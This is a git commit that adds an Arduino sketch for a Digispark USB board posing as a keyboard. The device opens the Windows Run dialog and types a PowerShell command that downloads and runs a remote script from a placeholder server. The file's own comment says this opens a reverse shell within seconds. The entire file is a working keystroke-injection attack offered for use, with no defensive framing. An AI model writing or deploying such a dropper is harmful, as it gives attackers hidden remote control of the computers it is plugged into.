a66d5cec4bf0934ae354235be403977669095919
CedArctic <kdoumani98@gmail.com>
2018-05-05 09:38:12 +0300

    Create Reverse_Shell.ino

---
+++ Reverse_Shell/Reverse_Shell.ino
@@ -0,0 +1,18 @@
+// This script downloads and executes a powershell script efectively opening up a reverse shell in less than 3 seconds. 
+// Credits to hak5 and samratashok (developer of the nishang framework).
+
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://mywebserver/payload.ps1');\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for (;;) {
+    /*Stops the digispark from running the scipt again*/
+  }
+}
